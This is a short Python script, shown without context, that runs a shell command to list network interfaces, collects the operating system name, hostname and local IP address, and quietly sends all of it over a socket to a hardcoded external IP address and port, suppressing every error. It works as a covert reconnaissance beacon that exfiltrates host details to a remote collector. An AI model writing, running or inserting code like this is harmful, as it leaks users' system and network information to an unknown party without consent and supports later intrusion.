import socket, platform, subprocess

ip, port, cmd = "135.235.193.119", 36452, "ip a" if platform.system() == "Linux" else "ipconfig"

try: net = subprocess.check_output(cmd, shell=True).decode(errors="ignore")
except: net = "cmd failed"

info = f"os: {platform.system()}\nhost: {socket.gethostname()}\nip: {socket.gethostbyname(socket.gethostname())}\n\n{net}"

with socket.socket() as s:
    try: s.connect((ip, port)); s.sendall(info.encode())
    except: pass
